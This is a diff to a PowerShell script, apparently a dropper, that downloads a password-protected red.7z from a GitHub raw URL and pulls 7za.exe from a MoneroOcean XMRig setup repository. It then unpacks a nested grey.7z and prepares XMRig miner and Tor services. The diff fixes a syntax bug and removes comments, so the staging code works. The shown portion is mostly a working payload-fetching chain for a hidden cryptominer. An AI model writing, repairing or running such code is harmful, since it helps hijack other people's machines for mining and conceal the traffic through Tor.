@@ -1,13 +1,13 @@
 # ============================================
-# TEST DEPLOYMENT SCRIPT
-# Use this to test your GitHub-hosted red.7z
+# CORRECTED TEST DEPLOYMENT SCRIPT
+# Fixed the $ExtractDir variable syntax error
 # ============================================
 
 # CONFIGURATION - CHANGE THESE!
-$Red7zUrl = "https://raw.githubusercontent.com/flanker411/logs/refs/heads/main/red.7z"  # YOUR URL HERE
-$DecryptionPassword = "red!"  # MUST match what you used for grey.7z
+$Red7zUrl = "https://raw.githubusercontent.com/flanker411/logs/refs/heads/main/red.7z"
+$DecryptionPassword = "red"
 
-# Test service names (use obvious names for testing)
+# Test service names
 $ServiceNameXMRig = "TestMinerService"
 $ServiceNameTor = "TestTorService"
 
@@ -44,25 +44,23 @@ try {
     Write-Host "Troubleshooting:" -ForegroundColor Yellow
     Write-Host "1. Is the URL correct? Try opening it in browser" -ForegroundColor Gray
     Write-Host "2. Is the repository public?" -ForegroundColor Gray
-    Write-Host "3. GitHub may block automated downloads - try using 'raw.githubusercontent.com' URL" -ForegroundColor Gray
+    Write-Host "3. The file 'red.7z' may not exist in that repository" -ForegroundColor Gray
     pause
     exit 1
 }
 
-# Check if we have 7za.exe (download bootstrap if needed)
+# Download 7za.exe bootstrap
 Write-Host ""
 Write-Host "[2] Getting 7za.exe..." -ForegroundColor Yellow
 
 $Bootstrap7z = "$TestDir\7za.exe"
 if (-not (Test-Path $Bootstrap7z)) {
-    # Try to get from red.7z first (will need 7z to extract... chicken-egg)
-    # For testing, download from official source
     $SevenZipUrl = "https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe"
     try {
         Invoke-WebRequest -Uri $SevenZipUrl -OutFile $Bootstrap7z -UseBasicParsing
         Write-Host "[+] Downloaded bootstrap 7za.exe" -ForegroundColor Green
     } catch {
-        Write-Host "[-] Cannot download 7za.exe. Please place 7za.exe in $TestDir manually" -ForegroundColor Red
+        Write-Host "[-] Cannot download 7za.exe" -ForegroundColor Red
         pause
         exit 1
     }
@@ -90,7 +88,6 @@ Write-Host "[4] Looking for grey.7z..." -ForegroundColor Yellow
 $Grey7z = Get-ChildItem -Path $ExtractDir -Recurse -Filter "*.7z" | Where-Object { $_.Name -ne "red.7z" -and $_.Name -like "*grey*" } | Select-Object -First 1 -ExpandProperty FullName
 
 if (-not $Grey7z) {
-    # Try any 7z file
     $Grey7z = Get-ChildItem -Path $ExtractDir -Recurse -Filter "*.7z" | Select-Object -First 1 -ExpandProperty FullName
 }
 
@@ -99,7 +96,8 @@ if ($Grey7z) {
     Write-Host "    File size: $((Get-Item $Grey7z).Length) bytes" -ForegroundColor Gray
 } else {
     Write-Host "[-] Could not find grey.7z in extracted files!" -ForegroundColor Red
-    Write-Host "[*] Contents of $ExtractDir:" -ForegroundColor Yellow
+    # FIXED: Removed the colon after $ExtractDir variable
+    Write-Host "[*] Contents of $ExtractDir :" -ForegroundColor Yellow
     Get-ChildItem -Path $ExtractDir -Recurse | ForEach-Object { Write-Host "    $($_.FullName)" }
     pause
     exit 1
